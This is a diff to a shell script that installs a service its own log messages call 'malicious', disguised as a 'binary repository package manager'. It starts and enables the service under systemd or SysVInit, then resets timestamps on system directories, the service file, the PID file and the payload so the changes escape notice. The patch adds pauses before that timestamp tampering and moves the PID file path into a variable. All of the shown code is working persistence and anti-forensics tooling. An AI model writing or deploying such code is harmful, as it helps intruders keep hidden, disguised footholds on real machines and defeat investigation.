@@ -136,11 +136,12 @@ WantedBy=multi-user.target"
 
 # SysVInit
 INIT_SERVICE_PATH="/etc/init/${SERVICE_NAME}.conf"
+INIT_PID_PATH="/var/run/brpm.pid"
 INIT_SERVICE="description \"binary repository package manager\"
 start on filesystem or runlevel 2345
 stop on shutdown
 script
-    echo \$\$ > /var/run/drpm.pid
+    echo \$\$ > $INIT_PID_PATH
     $SERVICE_COMMAND
 end script"
 
@@ -269,6 +270,8 @@ if pidof systemd &>/dev/null; then # systemd
 		systemctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"
 		systemctl enable "$SERVICE_NAME" && cecho info "Enabled malicious service '$SERVICE_NAME'" || cecho error "Could not enable maliicous service '$SERVICE_NAME'"
 
+		sleep 1 # ensure everything's ran before modifying timestamps
+
 		set_timestamp $etc_system_timestamp "/etc/systemd/system"
 		set_timestamp $etc_system_timestamp "$SYSTEMD_SERVICE_PATH"
 		set_timestamp $bin_timestamp "/bin"
@@ -291,10 +294,12 @@ elif [ -d "/etc/init" ]; then # SysVInit
 
 		initctl start "$SERVICE_NAME" && cecho info "Started malicious service '$SERVICE_NAME'" || cecho error "Could not start malicious service '$SERVICE_NAME'"
 
+		sleep 1 # ensure everything's ran before modifying timestamps
+
 		set_timestamp $init_timestamp "/etc/init"
 		set_timestamp $init_timestamp "$INIT_SERVICE_PATH"
 		set_timestamp $run_timestamp "/var/run"
-		set_timestamp $run_timestamp "/var/run/drpm.pid"
+		set_timestamp $run_timestamp "$INIT_PID_PATH"
 		set_timestamp $bin_timestamp "/bin"
 		set_timestamp $bin_timestamp "$SERVICE_PAYLOAD_PATH"
 	fi
